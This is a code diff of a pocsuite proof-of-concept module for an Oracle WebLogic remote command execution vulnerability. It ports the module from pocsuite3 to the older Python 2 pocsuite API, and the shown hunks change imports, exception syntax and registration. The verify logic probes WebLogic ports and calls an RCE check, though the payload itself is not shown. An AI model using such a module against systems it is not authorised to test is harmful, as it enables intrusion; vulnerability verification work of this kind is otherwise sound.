@@ -2,12 +2,11 @@
 # coding: utf-8
 import random
 import string
+import urlparse
 import time
-from urllib.parse import urlparse
-from pocsuite3.api import requests as req
-from pocsuite3.api import register_poc
-from pocsuite3.api import Output, POCBase
-from pocsuite3.api import POC_CATEGORY, VUL_TYPE
+from pocsuite.api.request import req
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output, POCBase
 
 
 class TestPOC(POCBase):
@@ -24,8 +23,7 @@ class TestPOC(POCBase):
     appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
     appName = 'WebLogic'
     appVersion = 'All'
-    vulType = VUL_TYPE.CODE_EXECUTION
-    category = POC_CATEGORY.EXPLOITS.REMOTE
+    vulType = 'Remote Command Execution'
     desc = '''
     Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。
 Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。以下组版本受到影响：Oracle WebLogic Server 10.3.6.0.0版本，12.1.3.0.0版本，12.2.1.1.0版本，12.2.1.2.0版本。
@@ -34,7 +32,7 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
 
     def _verify(self):
         flag = "".join(random.choice(string.ascii_letters)
-                       for _ in range(0, 8))
+                       for _ in xrange(0, 8))
         output_file = '{}.txt'.format(flag)
         '''
         payload的格式化
@@ -75,7 +73,7 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
                     return (False, r.status_code)
             except req.exceptions.ReadTimeout:
                 return (False, 'timeout')
-            except Exception as ex:
+            except Exception, ex:
                 # raise
                 return (False, str(ex))
 
@@ -99,7 +97,7 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
                     return (False, '{} something went wrong'.format(r.status_code))
             except req.exceptions.ReadTimeout:
                 return (False, 'timeout')
-            except Exception as ex:
+            except Exception, ex:
                 # raise
                 return (False, str(ex))
 
@@ -107,11 +105,11 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
         verify:
         '''
         result = {}
-        pr = urlparse(self.url)
+        pr = urlparse.urlparse(self.url)
         if pr.port:  # and pr.port not in ports:
             ports = [pr.port]
         else:
-            ports = [7001, 17001, 27001]
+            ports = [7001,17001,27001]
         for port in ports:
             uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
             status, msg = weblogic_rce(uri)
@@ -134,4 +132,4 @@ Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组�
         return output
 
 
-register_poc(TestPOC)
+register(TestPOC)
